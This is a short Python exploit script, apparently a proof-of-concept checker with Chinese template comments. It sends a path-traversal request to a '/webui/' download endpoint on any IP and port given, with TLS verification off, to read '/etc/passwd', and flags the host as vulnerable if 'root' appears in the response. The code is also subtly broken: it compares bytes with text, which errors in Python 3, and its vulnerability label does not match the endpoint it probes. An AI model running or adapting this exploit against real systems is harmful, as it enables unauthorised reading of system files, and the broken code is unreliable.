#encoding:utf-8
try:
    import requests,os,logging,sys
    logging.basicConfig(level=logging.INFO,format="%(message)s")
    requests.packages.urllib3.disable_warnings()
except Exception as e:
    logging.info("[*]".format(e))
    os._exit(6)

def check(ip,port):
    
    payload = "/webui/?g=sys_dia_data_down&file_name=../../../../../../../etc/passwd"                                                      #填写payload
    try:
        tar = "https://" + ip + ":" + port
        ssl = requests.session()
        req = ssl.get(tar + payload,timeout=3,verify=False)
        if req.status_code == 200:                                                          #修改匹配返回代码
            if ( b"root" in req.text ) :          #填写匹配信息
                logging.info("[+] {} find JQuery_1.7.2Version_site_foreground_arbitrary_file_download".format(ip))                                 #填写漏洞信息
                os._exit(1)

            else :
                logging.info("[-] {} do not found JQuery_1.7.2Version_site_foreground_arbitrary_file_download".format(ip))                         #填写漏洞信息
                os._exit(2)

        else :
            logging.info("[-] {} do not found JQuery_1.7.2Version_site_foreground_arbitrary_file_download".format(ip))                             #填写漏洞信息
            os._exit(2)
    except Exception as e:
        logging.info("[*] {}".format(e))
        os._exit(4)

if __name__ == "__main__":
    ip = sys.argv[1]
    port = sys.argv[2]
    check(ip,port)
